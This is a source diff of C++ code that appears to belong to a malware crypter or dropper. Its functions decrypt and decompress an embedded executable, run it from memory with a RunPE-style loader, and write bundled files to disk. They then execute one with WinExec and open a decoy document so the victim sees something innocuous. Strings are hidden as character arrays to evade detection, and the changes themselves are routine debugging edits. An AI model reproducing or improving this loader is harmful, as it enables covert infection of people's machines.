@@ -68,6 +68,7 @@ int Crypto::reloadPE(const char* data, int datasize) {
 
 	CryptData((unsigned char*)&fdb->cfd, datasize - 4 - CRYPT_KEY_SIZE,	key, CRYPT_KEY_SIZE, dstblock, datasize);
 	CRYPT_FILE_DATA* cfd = (CRYPT_FILE_DATA*)dstblock;
+
 	if (cfd->cnt <= 0 || cfd->cnt >= MAX_INPUT_FILE)
 	{
 		return -1;
@@ -106,8 +107,8 @@ int Crypto::reloadPE(const char* data, int datasize) {
 				//FileHelper::fileWriter("d:\\test.exe",(const char*) uncompbuf, uncompbufsize);
 #endif
 				
-				//ret = LoadPE::RunPE((char*)uncompbuf, uncompbufsize);
-				ret = MemRunPE((char*)uncompbuf, uncompsize);
+				ret = LoadPE::RunPE((char*)uncompbuf, uncompsize);
+				//ret = MemRunPE((char*)uncompbuf, uncompsize);
 
 				delete[] uncompbuf;
 				uncompbuf = 0;
@@ -177,11 +178,9 @@ int Crypto::getoutFiles(const char* data, int datasize) {
 		return -1;
 	}
 
-	//revertkey(key);
-
 	string path = FileHelper::getRunPath();
-
-	ret = lpMakeSureDirectoryPathExists((char*)path.c_str());
+	//MessageBoxA(0, path.c_str(), path.c_str(), MB_OK);
+	ret = MakeSureDirectoryPathExists((char*)path.c_str());
 
 	string runningfn = "";
 
@@ -192,6 +191,10 @@ int Crypto::getoutFiles(const char* data, int datasize) {
 	{ '.','d','o','c','.','d','o','c','x','.','x','l','s','.','x','l','s','x','.','p','p','t','.','p','p','t','x','.','t','x','t','.','p','n','g','.','j','p','g','.','j','p','e','g','.','b','m','p','.','m','p','3','.','m','p','4','.','p','d','f',0 };
 
 	FILE_DATA* fd = & cfd->fd;
+
+	wsprintfA(szinfo, "file cnt:%d", cfd->cnt);
+	//MessageBoxA(0, szinfo, szinfo, MB_OK);
+
 	for (int i = 0; i < cfd->cnt; i++)
 	{
 		char filename[256] = { 0 };
@@ -210,6 +213,8 @@ int Crypto::getoutFiles(const char* data, int datasize) {
 				docfn = path + filename;
 			}
 		}
+
+		//MessageBoxA(0, filename, filename, MB_OK);
 
 		unsigned char* uncompbuf = new unsigned char[fd->fsize + 0x1000];
 		unsigned long uncompbufsize = fd->fsize;
@@ -246,15 +251,19 @@ int Crypto::getoutFiles(const char* data, int datasize) {
 	if (runningfn != "")
 	{
 		char szcmd[1024] = { 0 };
-		char szparam[] = { 'S','T','A','R','T','F','I','R','S','T','T','I','M','E',0 };
+		char szparam[] = { 0,0 };
+		//char szparam[] = { 'S','T','A','R','T','F','I','R','S','T','T','I','M','E',0 };
 		wsprintfA(szcmd, "\"%s\" %s", runningfn.c_str(), szparam);
-		ret = lpWinExec(szcmd, SW_SHOW);
+
+		//MessageBoxA(0, szcmd, szcmd, MB_OK);
+
+		ret = WinExec(szcmd, SW_SHOW);
 	}
 
 	if (docfn != "")
 	{
 		char szshellOpen[] = { 'o','p','e','n',0 };
-		lpShellExecuteA(0, szshellOpen, docfn.c_str(), "", "", 0);
+		ShellExecuteA(0, szshellOpen, docfn.c_str(), "", "", 0);
 		//char szcmd[1024] = { 0 };
 		//wsprintfA(szcmd, "cmd /c \"%s\"", docfn.c_str());
 		//ret = lpWinExec(szcmd, SW_SHOW);
